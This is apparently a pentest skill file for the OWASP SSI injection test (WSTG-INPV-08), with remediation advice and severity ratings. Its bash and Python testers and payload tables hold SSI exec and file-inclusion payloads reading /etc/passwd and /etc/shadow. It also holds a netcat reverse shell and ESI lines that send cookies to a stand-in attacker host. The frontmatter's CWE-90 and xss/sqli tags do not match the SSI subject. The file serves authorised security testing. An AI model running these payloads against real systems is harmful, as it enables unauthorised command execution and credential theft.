---
name: wstg-inpv-08
description: "Testing for SSI Injection"
category: input-validation
owasp_id: WSTG-INPV-08
version: "1.0.0"
author: cyberstrike-official
tags: [injection, input-validation, xss, sqli, wstg, inpv]
tech_stack: []
cwe_ids: [CWE-90]
chains_with: [wstg-inpv-06, wstg-inpv-01]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost: {}
---

# wstg-inpv-08

## Test ID

WSTG-INPV-08

## Test Name

Testing for SSI Injection

## High-Level Description

Server-Side Includes (SSI) Injection occurs when an attacker can inject SSI directives into web pages that are processed by the web server. SSI allows embedding dynamic content into HTML pages, and successful injection can lead to arbitrary command execution, file disclosure, or other server-side attacks.

---

## What to Check

- [ ] SSI directive injection
- [ ] File inclusion via SSI
- [ ] Command execution via SSI
- [ ] Virtual includes
- [ ] .shtml, .stm, .shtm extensions
- [ ] XBitHack configuration

---

## How to Test

### Step 1: Identify SSI Processing

```bash
#!/bin/bash
TARGET="https://target.com"

# Check for SSI file extensions
echo "[*] Checking for SSI-enabled files..."
for ext in shtml stm shtm; do
    curl -s -o /dev/null -w "%{http_code}" "$TARGET/index.$ext"
done

# Test SSI injection
echo "[*] Testing SSI injection..."

SSI_PAYLOADS=(
    '<!--#echo var="DATE_LOCAL" -->'
    '<!--#exec cmd="id" -->'
    '<!--#include virtual="/etc/passwd" -->'
    '<!--#printenv -->'
)

for payload in "${SSI_PAYLOADS[@]}"; do
    encoded=$(echo -n "$payload" | jq -sRr @uri)
    response=$(curl -s "$TARGET/page?input=$encoded")
    echo "Payload: $payload"
    echo "Response: ${response:0:200}"
done
```

### Step 2: SSI Injection Tester

```python
#!/usr/bin/env python3
"""
SSI Injection Vulnerability Tester
"""

import requests
from urllib.parse import quote

class SSIInjectionTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # SSI injection payloads
    SSI_PAYLOADS = {
        'detection': [
            '<!--#echo var="DATE_LOCAL" -->',
            '<!--#echo var="DOCUMENT_NAME" -->',
            '<!--#echo var="SERVER_SOFTWARE" -->',
            '<!--#printenv -->',
        ],
        'file_inclusion': [
            '<!--#include virtual="/etc/passwd" -->',
            '<!--#include file="/etc/passwd" -->',
            '<!--#include virtual="/.htpasswd" -->',
            '<!--#include virtual="/etc/shadow" -->',
        ],
        'command_execution': [
            '<!--#exec cmd="id" -->',
            '<!--#exec cmd="whoami" -->',
            '<!--#exec cmd="cat /etc/passwd" -->',
            '<!--#exec cgi="/cgi-bin/script.cgi" -->',
        ],
        'config': [
            '<!--#config timefmt="%Y" -->',
            '<!--#config errmsg="SSI_TEST" -->',
        ],
    }

    def test_ssi_detection(self, param='input'):
        """Test if SSI is processed"""
        print("\n[*] Testing SSI detection...")

        for payload in self.SSI_PAYLOADS['detection']:
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload}
                )

                # Check for SSI output indicators
                indicators = [
                    'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun',  # DATE
                    'Apache', 'nginx', 'IIS',  # SERVER_SOFTWARE
                    'DOCUMENT_ROOT', 'SERVER_NAME',  # printenv
                ]

                for indicator in indicators:
                    if indicator in response.text and payload not in response.text:
                        print(f"[VULN] SSI is being processed!")
                        print(f"  Payload: {payload}")
                        self.findings.append({
                            'type': 'SSI Processing Detected',
                            'payload': payload,
                            'severity': 'High'
                        })
                        return True

                # Check if payload is reflected raw (not processed)
                if payload in response.text:
                    print(f"[INFO] SSI payload reflected but not processed")

            except Exception as e:
                pass

        return False

    def test_file_inclusion(self, param='input'):
        """Test SSI file inclusion"""
        print("\n[*] Testing SSI file inclusion...")

        for payload in self.SSI_PAYLOADS['file_inclusion']:
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload}
                )

                # Check for /etc/passwd content
                if 'root:' in response.text:
                    print(f"[VULN] SSI File Inclusion!")
                    print(f"  Payload: {payload}")
                    self.findings.append({
                        'type': 'SSI File Inclusion',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def test_command_execution(self, param='input'):
        """Test SSI command execution"""
        print("\n[*] Testing SSI command execution...")

        for payload in self.SSI_PAYLOADS['command_execution']:
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload}
                )

                # Check for command output indicators
                if 'uid=' in response.text or 'gid=' in response.text:
                    print(f"[VULN] SSI Command Execution!")
                    print(f"  Payload: {payload}")
                    self.findings.append({
                        'type': 'SSI Command Execution',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("SSI INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo SSI injection vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                print(f"  Payload: {f['payload']}")

    def run_tests(self, param='input'):
        """Run all SSI tests"""
        self.test_ssi_detection(param)
        self.test_file_inclusion(param)
        self.test_command_execution(param)
        self.generate_report()

# Usage
tester = SSIInjectionTester("https://target.com/page.shtml")
tester.run_tests()
```

### Step 3: SSI Directive Reference

```apache
# SSI Directives

# Echo - Display variables
<!--#echo var="DATE_LOCAL" -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DOCUMENT_URI" -->
<!--#echo var="LAST_MODIFIED" -->
<!--#echo var="SERVER_SOFTWARE" -->

# Include - Include files
<!--#include virtual="/header.html" -->
<!--#include file="footer.html" -->

# Exec - Execute commands/CGI
<!--#exec cmd="ls -la" -->
<!--#exec cgi="/cgi-bin/counter.cgi" -->

# Config - Configure SSI behavior
<!--#config timefmt="%A %B %d, %Y" -->
<!--#config sizefmt="bytes" -->
<!--#config errmsg="Error occurred" -->

# Printenv - Print environment
<!--#printenv -->

# Set - Set variables
<!--#set var="name" value="John" -->

# If/Elif/Else - Conditionals
<!--#if expr="${QUERY_STRING} = 'admin'" -->
Admin content
<!--#endif -->

# Flastmod - File last modified
<!--#flastmod virtual="/file.html" -->

# Fsize - File size
<!--#fsize file="document.pdf" -->
```

---

## Tools

| Tool           | Purpose           |
| -------------- | ----------------- |
| Burp Suite     | Parameter fuzzing |
| curl           | Manual testing    |
| Custom scripts | Automated testing |

---

## Example Commands/Payloads

```bash
# Quick SSI injection probe
curl -s "https://{target}/page.shtml?input=%3C%21--%23exec+cmd%3D%22id%22+--%3E"

# Confirm SSI processing via date echo
curl -s "https://{target}/page.shtml" -d 'comment=<!--#echo var="DATE_LOCAL" -->'

# Read /etc/passwd through SSI include
curl -s "https://{target}/page.shtml?input=%3C%21--%23include+virtual%3D%22%2Fetc%2Fpasswd%22+--%3E" | grep -o 'root:.*'
```

| Payload | Technique | Detection Pattern |
| --- | --- | --- |
| `<!--#exec cmd="id" -->` | Command execution | `uid=` / `gid=` in response |
| `<!--#include virtual="/etc/passwd" -->` | File inclusion | `root:.*:0:0:` in response |
| `<!--#echo var="DATE_LOCAL" -->` | Detection | Day-of-week string appears though payload wasn't reflected literally |
| `<!--#printenv -->` | Environment disclosure | `DOCUMENT_ROOT`, `SERVER_SOFTWARE` strings in response |
| `<!--#exec cmd="mkfifo /tmp/f;nc {ip} {port} 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` | Reverse shell via SSI exec | Inbound connection on listener |

### Edge Side Includes (ESI) Injection — for responses passed through a caching surrogate (Varnish/Squid/Akamai/Fastly)

SSI and ESI are different attack surfaces: SSI runs on the origin web server, ESI runs on the CDN/reverse-proxy layer, so ESI is reachable even when the origin has no SSI processing at all. Some surrogates require the upstream response to carry `Surrogate-Control: content="ESI/1.0"` before they will process ESI tags in the body.

```bash
# Blind detection via OOB callback
curl -s "https://{target}/page?input=%3Cesi%3Ainclude%20src%3Dhttp%3A%2F%2F{collaborator}%3E"

# XSS via injected ESI include
curl -s "https://{target}/page?input=<esi:include src=http://{attacker}/xss.html>"

# Cookie exfiltration (surrogate substitutes $(HTTP_COOKIE))
curl -s "https://{target}/page?input=<esi:include src=http://{attacker}/steal?c=\$(HTTP_COOKIE)>"

# Local file/secret disclosure via surrogate-side include
curl -s "https://{target}/page?input=<esi:include src=\"/supersecret.txt\">"

# Debug info disclosure (Akamai/Squid)
curl -s "https://{target}/page?input=<esi:debug/>"
```

Support for vars/cookies/host-allowlist varies by surrogate (Squid3, Varnish, Fastly, Akamai ETS, Node `esi`/`nodesi`) — test each capability individually since a WAF/CDN may only expose a subset.

---

## Remediation

```apache
# Apache - Disable SSI exec
<Directory "/var/www/html">
    Options +Includes -IncludesNOEXEC
</Directory>

# Or disable SSI entirely
<Directory "/var/www/html">
    Options -Includes
</Directory>

# Restrict SSI to specific files
AddType text/html .shtml
AddOutputFilter INCLUDES .shtml
```

```nginx
# Nginx - Disable SSI
ssi off;

# Or restrict
ssi on;
ssi_types text/html;
```

---

## Risk Assessment

| Finding                    | CVSS | Severity |
| -------------------------- | ---- | -------- |
| SSI command execution      | 9.8  | Critical |
| SSI file inclusion         | 7.5  | High     |
| SSI information disclosure | 5.3  | Medium   |

---

## CWE Categories

| CWE ID     | Title                                                 |
| ---------- | ----------------------------------------------------- |
| **CWE-97** | Improper Neutralization of Server-Side Includes (SSI) |


---

## References

- [OWASP WSTG - WSTG-INPV-08: Testing for SSI Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection)
- [PayloadsAllTheThings - Server Side Includes Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Includes%20Injection)

---

## Checklist

```
[ ] SSI file extensions identified
[ ] SSI processing tested
[ ] File inclusion tested
[ ] Command execution tested
[ ] Environment disclosure tested
[ ] Findings documented
```
